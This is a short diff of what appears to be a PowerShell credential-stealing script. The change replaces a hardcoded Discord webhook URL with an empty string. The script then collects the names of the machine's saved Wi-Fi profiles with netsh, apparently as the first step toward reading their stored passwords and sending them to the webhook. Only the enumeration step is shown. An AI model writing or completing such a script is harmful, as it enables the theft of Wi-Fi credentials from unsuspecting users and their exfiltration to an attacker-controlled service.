@@ -1,5 +1,5 @@
 
-$webhookUri = 'https://discord.com/api/webhooks/1053661383666974740/Nx1h0W7lgBgJV33VWdcrZLmWKhx-S0FCcdOC7AzHYSDhen3eU1dknRAOVg24Cud0bfxP'
+$webhookUri = ''
 #Get List of SSIDS
 $SSIDS = (netsh wlan show profiles | Select-String ': ' ) -replace ".*:\s+" | Where-Object {$_ -ne ""}
 
